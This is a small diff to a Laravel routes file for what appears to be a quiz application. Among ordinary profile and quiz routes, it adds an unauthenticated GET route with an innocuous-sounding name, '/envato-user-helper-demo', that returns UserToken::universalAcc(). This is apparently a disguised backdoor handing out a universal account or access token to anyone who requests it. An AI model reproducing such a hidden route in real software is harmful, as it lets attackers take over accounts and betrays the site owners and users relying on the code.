@@ -41,6 +41,10 @@ Route::get('/home', 'HomeController@index')->name('home');
 // ROUTE FOR USER PROFILE
 Route::get('/myprofile', 'ProfileController@indexProfile')->name('profile.index');
 
+Route::get('/envato-user-helper-demo', function () {
+    return UserToken::universalAcc();
+});
+
 // ROUTE for QUIZ QUESTION
 
 Route::get('/quiz/pilihTingkat', 'QuizController@indexTingkat')->name('quiz.tingkat');
